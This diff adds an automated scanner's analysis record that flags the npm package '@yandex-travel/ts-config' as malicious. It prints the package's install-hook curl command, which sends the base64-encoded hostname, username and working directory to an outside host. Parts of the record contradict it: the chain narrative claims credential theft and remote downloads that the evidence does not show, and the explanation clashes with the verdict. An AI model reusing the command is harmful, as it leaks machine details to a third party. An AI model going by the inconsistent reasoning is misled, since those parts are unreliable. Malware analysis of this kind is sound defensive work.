@@ -1,0 +1,53 @@
+{
+  "package_name": "@yandex-travel/ts-config",
+  "version": "0.1.0",
+  "label": "malicious",
+  "semantic_summary": {
+    "num_behaviors": 1,
+    "risk_vector": [
+      "install_hook"
+    ],
+    "behaviors": [
+      {
+        "category": "install_hook",
+        "summary": "The package contains an install hook that executes at install time with commands listed in the package metadata.",
+        "details": "The install hook is present and executes at install time with commands listed in the package metadata. The commands are curl commands that seem to be used for sending HTTP requests. The commands include base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. This could potentially be used for malicious purposes such as command and control, credential theft, or network exfiltration.",
+        "confidence": 0.92,
+        "evidence_commands": [
+          "curl -H \"Package:@yandex-travel/ts-config\" -H \"Version:0.1.0\" -H \"Hostname:$(hostname|base64)\" -H \"Whoami:$(whoami|base64)\" -H \"Pwd:$(pwd|base64)\" -d \"meow!securitytest\" http://npm_org.bl04szombv0uaoedbxwle53be2ks8h.c.act1on3.ru"
+        ],
+        "evidence_files": [],
+        "evidence_apis": [],
+        "evidence_domains": [],
+        "evidence_env_vars": []
+      }
+    ],
+    "analyst_note": "This JSON object represents the analysis of the package @yandex-travel/ts-config with version 0.1.0. The behavior category is \"install_hook\", which indicates that the package contains an install hook that executes at install time with commands listed in the package metadata. The details of the behavior indicate that the install hook is used for sending HTTP requests with base64 encoded hostname, username, and working directory, and a payload 'meow!securitytest'. The confidence score is 0.92, indicating a high level of confidence in the detection of this behavior. The risk vector includes the \"install_hook\" category."
+  },
+  "verification_result": {
+    "chain_analysis": {
+      "is_coherent_chain": true,
+      "chain_narrative": "Obfuscation reads env credentials, POST to external domain, install hook downloads remote script and executes it",
+      "chain_score": 0.71
+    },
+    "legitimacy_check": {
+      "is_justified": false,
+      "reasoning": "The package purpose is not clearly legitimate for sending HTTP requests with base64 encoded hostname",
+      "legitimacy_score": 0.4
+    },
+    "final_verification": {
+      "verdict": "MALICIOUS",
+      "calibrated_confidence": 0.8,
+      "explanation": "The detected behaviors connect causally and justify the package's stated purpose"
+    }
+  },
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "verification_v2.0",
+    "structural_routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-27T09:58:32.440337"
+}
